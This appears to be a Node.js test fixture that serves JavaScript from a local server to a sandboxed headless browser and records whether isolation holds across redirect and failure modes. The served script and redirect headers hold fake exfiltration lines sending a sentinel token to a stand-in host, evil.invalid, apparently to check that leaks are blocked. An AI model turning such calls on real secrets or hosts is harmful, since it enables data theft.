import http from'node:http';
import fs from'node:fs';
import {waitForStart}from'../e-verify-group1-remaining-assets/supervisor.mjs';
import {loopbackTransport}from'./wire.mjs';
import {runIsolatedBrowser}from'./browser.mjs';
import {CAPS}from'./gate.mjs';
import {makeReceipt,finalizeReceipt}from'./receipts.mjs';
await waitForStart();const mode=process.argv[2],output=process.argv[3];let hits=0;
const server=http.createServer((q,r)=>{hits++;
 if(mode==='body-failure'){r.writeHead(200,{'content-type':'application/javascript','content-length':'100'});r.flushHeaders();setTimeout(()=>r.destroy(),20);return}
 r.writeHead(mode==='redirect'?302:200,{'content-type':'application/javascript',...(mode==='redirect'||mode==='location200'?{location:'https://evil.invalid/private?token=PRIVATE_SENTINEL'}:{})});
 r.end("window.qaStatus('RENDER_BEGIN');window.qaStatus('CALLBACK');fetch('https://evil.invalid/PRIVATE_SENTINEL');");
});
await new Promise(r=>server.listen(0,'127.0.0.1',r));const local=loopbackTransport('http://127.0.0.1:'+server.address().port);
const transport=(q,o)=>local({...q,url:'https://qa.example.invalid'+new URL(q.url).pathname+new URL(q.url).search},o);
let result;try{result=await runIsolatedBrowser({transport,headless:true,observeMs:5000,workMs:15000,caps:{...CAPS,thirdParty:1,GET:1,POST:0,document:0},sdkResponseOnly:true})}
finally{server.closeAllConnections();await new Promise(r=>server.close(r))}
const receipt=makeReceipt(result,{responseOnly:true});fs.writeFileSync(output,JSON.stringify({...receipt,fixtureHits:hits,fixtureOnly:true},null,2),{flag:'wx'});
await new Promise(r=>process.send({type:'receipt',status:'complete'},r));process.disconnect();
